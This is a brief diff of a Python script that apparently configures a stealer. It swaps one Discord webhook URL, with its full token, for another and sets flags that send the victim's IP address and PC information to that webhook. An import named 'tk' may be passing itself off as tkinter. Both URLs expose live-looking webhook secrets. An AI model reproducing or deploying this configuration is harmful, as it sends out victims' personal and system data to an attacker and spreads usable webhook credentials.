@@ -20,7 +20,7 @@ import random
 import string
 import ctypes
 import tk
-tk.WEBHOOK_URL = "https://discord.com/api/webhooks/908430380644843560/PQE_SEVj1KINUX9UBUkUxp9Cw2jT99B0_BtWaGHU4WEewvzwe917ysjYaA85h4fxmNEV"
+tk.WEBHOOK_URL = "https://discord.com/api/webhooks/908872964068478986/uUs7MM_65Ghb17lkhy808GVPKnA76ngfipvT52bohbhgGWRyKDXDBDTNCxf2mi0G4SDl"
 tk.PING_ME = True
 tk.SEND_IP = True
 tk.SEND_PC_INFO = True
